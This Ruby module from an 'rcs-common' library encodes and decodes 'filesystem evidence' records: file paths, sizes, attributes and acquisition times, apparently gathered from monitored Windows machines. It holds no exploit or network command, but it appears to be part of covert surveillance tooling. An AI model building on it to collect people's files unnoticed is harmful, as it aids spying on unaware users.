require 'rcs-common/evidence/common'

module RCS

module FilesystemEvidence

  FILESYSTEM_VERSION = 2010031501
  FILESYSTEM_IS_FILE = 0
	FILESYSTEM_IS_DIRECTORY = 1
	FILESYSTEM_IS_EMPTY     = 2

  def content
    path = "C:\\miao".to_utf16le_binary_null
    content = StringIO.new
    content.write [FILESYSTEM_VERSION, path.bytesize, FILESYSTEM_IS_FILE, 0, 0].pack("I*")
    content.write Time.now.getutc.to_filetime.pack('L*')
    content.write path

    content.string
  end
  
  def generate_content
    [ content ]
  end
  
  def decode_content(common_info, chunks)
    stream = StringIO.new chunks.join

    until stream.eof?

      info = Hash[common_info]

      version, path_len, attribute, size_hi, size_lo = stream.read(20).unpack("I*")
      raise EvidenceDeserializeError.new("invalid log version for FILESYSTEM [#{version} != #{FILESYSTEM_VERSION}]") unless version == FILESYSTEM_VERSION

      info[:data] = Hash.new if info[:data].nil?
      info[:data][:size] = size_hi << 32 | size_lo
      info[:data][:attr] = attribute
      info[:acquired] = Time.from_filetime(*stream.read(8).unpack('L*'))

      path = stream.read(path_len)
      next if path.nil?

      info[:data][:path] = path.to_utf16le_binary_null.utf16le_to_utf8

      # this is not the real clone! redefined clone ...
      yield info if block_given?
    end
  end
end

end # ::RCS